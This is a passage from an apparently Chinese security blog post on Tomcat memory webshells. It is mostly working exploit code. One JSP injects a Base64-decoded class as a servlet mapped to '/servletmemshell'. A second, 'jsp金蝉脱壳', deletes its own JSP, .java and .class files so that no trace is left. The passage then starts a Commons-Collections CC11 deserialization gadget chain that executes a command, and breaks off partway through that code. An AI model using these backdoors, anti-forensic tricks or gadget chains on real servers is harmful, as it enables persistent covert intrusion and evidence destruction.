java.lang.ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod(&amp;#34;defineClass&amp;#34;, byte[].class, int.class, int.class);
defineClass.setAccessible(true);
byte[] evil = java.util.Base64.getDecoder().decode(classCode);
Class&amp;lt;?&amp;gt; servletClass = (Class&amp;lt;?&amp;gt;) defineClass.invoke(classLoader, evil, 0, evil.length);
final String name = &amp;#34;servletshell&amp;#34;;
// 使用 Wrapper 封装 Servlet
org.apache.catalina.Wrapper newWrapper = standardContext.createWrapper();
newWrapper.setName(name);
newWrapper.setLoadOnStartup(1);
newWrapper.setServlet((Servlet) servletClass.newInstance());
newWrapper.setServletClass(servletClass.getName());
// 为内存马添加路由映射
standardContext.addChild(newWrapper);
standardContext.addServletMappingDecoded(&amp;#34;/servletmemshell&amp;#34;,name);
response.getWriter().write(&amp;#34;inject success&amp;#34;);
%&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&amp;lt;title&amp;gt;servletshell&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png" alt="image-20220531183048214">&lt;/p>
&lt;p>不过并没有看起来这么美好——服务器上一下子多了1个jsp 1个class 1个java&lt;/p>
&lt;h3 id="金蝉脱壳的jsp">金蝉脱壳的jsp&lt;/h3>
&lt;p>对于上面示范的动静较大的2种方式不能说一无是处吧，只能说是乏善可陈，而在&lt;a href="https://www.anquanke.com/post/id/224698">Tomcat容器攻防笔记之JSP金蝉脱壳&lt;/a>这篇文章中作者提出了jsp金蝉脱壳的思路，代码如下&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-jsp" data-lang="jsp">&amp;lt;%@ page import=&amp;#34;org.apache.catalina.connector.Request&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.mapper.MappingData&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.catalina.Wrapper&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.jasper.compiler.JspRuntimeContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.util.concurrent.ConcurrentHashMap&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.jasper.servlet.JspServletWrapper&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;org.apache.jasper.JspCompilationContext&amp;#34; %&amp;gt;
&amp;lt;%@ page import=&amp;#34;java.io.File&amp;#34; %&amp;gt;
&amp;lt;%
//从request对象中获取request属性
Field requestF = request.getClass().getDeclaredField(&amp;#34;request&amp;#34;);
requestF.setAccessible(true);
Request req = (Request) requestF.get(request);
//获取MappingData
MappingData mappingData = req.getMappingData();
//获取StandrardWrapper
Field wrapperF = mappingData.getClass().getDeclaredField(&amp;#34;wrapper&amp;#34;);
wrapperF.setAccessible(true);
Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);
//获取jspServlet对象
Field instanceF = wrapper.getClass().getDeclaredField(&amp;#34;instance&amp;#34;);
instanceF.setAccessible(true);
Servlet jspServlet = (Servlet) instanceF.get(wrapper);
//获取rctxt属性
Field rctxt = jspServlet.getClass().getDeclaredField(&amp;#34;rctxt&amp;#34;);
rctxt.setAccessible(true);
JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);
//获取jsps属性内容
Field jspsF = jspRuntimeContext.getClass().getDeclaredField(&amp;#34;jsps&amp;#34;);
jspsF.setAccessible(true);
ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);
//获取对应的JspServletWrapper
JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());
//获取ctxt属性保存的JspCompilationContext对象
Field ctxt = jsw.getClass().getDeclaredField(&amp;#34;ctxt&amp;#34;);
ctxt.setAccessible(true);
JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);
File targetFile;
targetFile = new File(jspCompContext.getClassFileName()); //删掉jsp的.class
targetFile.delete();
targetFile = new File(jspCompContext.getServletJavaFileName()); //删掉jsp的java文件
targetFile.delete();
//删除jsp文件
String __jspName = this.getClass().getSimpleName().replaceAll(&amp;#34;_&amp;#34;, &amp;#34;.&amp;#34;);
String path=application.getRealPath(__jspName);
File file = new File(path);
file.delete();
%&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531183048214.png" alt="image-20220531183048214">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220531185316461.png" alt="image-20220531185316461">通过大量的反射修改tomcat对jsp编译时的一些设置，做到上马后删除自身jsp并跳过jsp编译为class和java文件的过程，可以完全不留痕——好！！很有精神！！！&lt;/p>
&lt;h2 id="反序列化">反序列化&lt;/h2>
&lt;p>虽然前面我们得到了可以删除自身的金蝉脱壳jsp，但有个灵魂拷问——如果能传jsp了为什么不直接传冰蝎？确实，实际场景/CTF中更多的是反序列化RCE，为了方便我们可能会接着上内存马，&lt;strong>如果能再扩展一下冰蝎或哥斯拉那就更好了&lt;/strong>&lt;/p>
&lt;p>以CC11链为例，这是它的基本链&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ccTest&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassClassPath&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.ClassPool&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javassist.CtClass&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.map.LazyMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.FileInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.FileOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashSet&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;all&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC11&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#75af00">getBytescode&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 利用javassist动态创建恶意字节码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span> &lt;span style="color:#111">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ClassPool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDefault&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">insertClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ClassClassPath&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">AbstractTranslet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">cc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">makeClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Cat&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;java.lang.Runtime.getRuntime().exec(\&amp;#34;calc.exe\&amp;#34;);&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">makeClassInitializer&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">insertBefore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">randomClassName&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;EvilCat&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nanoTime&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">randomClassName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setSuperclass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">AbstractTranslet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()));&lt;/span> &lt;span style="color:#75715e">// 设置父类为AbstractTranslet 避免报错
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">cc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">field&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fieldName&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">field&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TemplatesImpl&lt;/span> &lt;span style="color:#111">templates&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TemplatesImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_bytecodes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[][]{&lt;/span>&lt;span style="color:#111">getBytescode&lt;/span>&lt;span style="color:#f92672">()});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_name&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;_class&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvokerTransformer&lt;/span> &lt;span style="color:#111">transformer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;asdfasdfasdf&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">],&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">]);&lt;/span> &lt;span style="color:#75715e">// 占位
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">LazyMap&lt;/span> &lt;span style="color:#111">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">(),&lt;/span>&lt;span style="color:#111">transformer&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TiedMapEntry&lt;/span> &lt;span style="color:#111">tiedmap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TiedMapEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">templates&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashSet&lt;/span> &lt;span style="color:#111">hashset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;map&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;backingMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span> &lt;span style="color:#111">hashset_map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NoSuchFieldException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;elementData&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 替换key为TiedMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span>&lt;span style="color:#111">f2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hashset_map&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
